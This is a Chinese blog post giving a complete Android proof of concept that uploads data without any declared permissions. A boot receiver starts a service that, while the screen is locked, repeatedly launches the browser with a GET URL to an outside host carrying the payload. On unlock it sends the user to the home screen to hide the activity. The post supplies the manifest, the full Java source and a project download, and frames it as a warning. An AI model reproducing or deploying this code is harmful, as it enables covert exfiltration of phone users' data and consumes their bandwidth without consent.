上次写过一篇文章  抛砖引玉 之 谁动了我的隐私(android用户隐私窥探)  描述如何读取系统log缓冲区但还存在权限提示问题。
这次来个稍微好点的，真正的0权限上传数据。
同上次讲的一样，虽然大部分用户在安装app时对权限警告视而不见，但相信以后用户会对权限问题越来越重视的。
这次咱们先真正的来一次0权限上传热热身。
#### 一、原理
首先利用的还是那个开机启动bug。
然后，在手机锁屏时上传数据。
如何上传数据呢，为了避免权限咱们得瞒天过海。
我们知道，在Intent转向的时候，可以转到标记为ACTION_VIEW的activity，而浏览器都有这个标记，可以传一个uri过去。
soga,说到这里，，明白了吧。就是使用http的GET传参，虽然只能传明文，但已经够了，更何况一次能传输的字节也还是很客观的。
至于传什么，每个想实现这种功能的人都有其目的吧。
#### 二、实现
首先是清单文件，不需要声明任何权限，只需要写一个广播接收者和一个服务即可。
```  
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="org.igeek.hack"
    android:versionCode="1"
    android:versionName="1.0" >
    <uses-sdk android:minSdkVersion="8" />
    <application
        android:icon="@drawable/icon"
        android:label="@string/app_name" >
        <receiver android:name=".reciver.HackReceiver" >
            <intent-filter android:priority="1000" >
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
        <service android:name=".service.HackerService" />
    </application>
</manifest>
```
然后就是广播接收者的实现，很简单，单纯的开启一个服务。
```  
import org.igeek.hack.service.HackerService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
public class HackReceiver extends BroadcastReceiver {
	@Override
	public void onReceive(Context context, Intent intent) {
		Intent it = new Intent(context, HackerService.class);
		context.startService(it);
	}
}
```
最后，就是关键部分，服务的实现。
```  
import java.util.Random;
import android.app.KeyguardManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
public class HackerService extends Service {
	private ScreenOnBroadcastReciver soReciver;
	private ScreenOFFBroadcastReciver sfReciver;
	private Handler handler;
	final static String LOG_TAG = "hack";
	KeyguardManager keyguardManager;
	Intent it;
	// GET提交地址
	final String HACK_URL = "http://www.igeek.org/hack?info=";
	private Runnable r = new Runnable() {
		@Override
		public void run() {
			// 如果是锁屏状态
			if (keyguardManager.inKeyguardRestrictedInputMode()) {
				// GET上传，内容随你
				String hackInfo = "hack!!!!your information!!!!!!!&r=
						+ new Random().nextFloat();
				it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				Uri uri = Uri.parse(HACK_URL + hackInfo);
				it.setData(uri);
				startActivity(it);
				Log.i(LOG_TAG, "提交数据->" + HACK_URL + hackInfo);
				// 每隔5秒，执行一次上传
				handler.postDelayed(r, 5000);
			}
		}
	};
	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);
		keyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
		it = new Intent(Intent.ACTION_VIEW);
		handler = new Handler();
		Log.i(LOG_TAG, "开机完成，注册广播接收者");
		soReciver = new ScreenOnBroadcastReciver();
		sfReciver = new ScreenOFFBroadcastReciver();
		IntentFilter onIntentFilter = new IntentFilter(
				"android.intent.action.SCREEN_ON");
		registerReceiver(soReciver, onIntentFilter);
		IntentFilter offIntentFilter = new IntentFilter(
				"android.intent.action.SCREEN_OFF");
		registerReceiver(sfReciver, offIntentFilter);
	}
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
	[Tags]/**
	 [Tags]* 解锁广播接收者
	 [Tags]*/
	class ScreenOnBroadcastReciver extends BroadcastReceiver {
		@Override
		public void onReceive(Context context, Intent intent) {
			Log.i(LOG_TAG, "屏幕解开");
			handler.removeCallbacks(r);
			intent.setAction(Intent.ACTION_MAIN);
			intent.addCategory(Intent.CATEGORY_HOME);
			intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			Log.i(LOG_TAG, "转向HOME");
			startActivity(intent);
		}
	}
	[Tags]/**
	 [Tags]* 锁屏广播接收者
	 [Tags]*/
	class ScreenOFFBroadcastReciver extends BroadcastReceiver {
		@Override
		public void onReceive(final Context context, Intent intent) {
			Log.i(LOG_TAG, "屏幕锁住");
			// 500ms后开始执行上传数据
			handler.postDelayed(r, 500);
		}
	}
}
```
#### 三、效果
哈，运行下试试，关机。。。开机。。。锁屏。。解锁。。没发现什么反应啊。。。再看看程序管理。。Hack程序也没有任何权限提示啊。
![img](P)  
真的这样吗？来看看log。
![img](P)  
you see? 流量就这么悄悄的耗了。
本工程包地址：hack_0p_upload.zip
#### 结束语
这么流氓的伎俩，相信谁都不想碰到，google market也混乱的一塌糊涂，android app混乱的不成样子，大家还是擦亮双眼，安全，一定要注意的。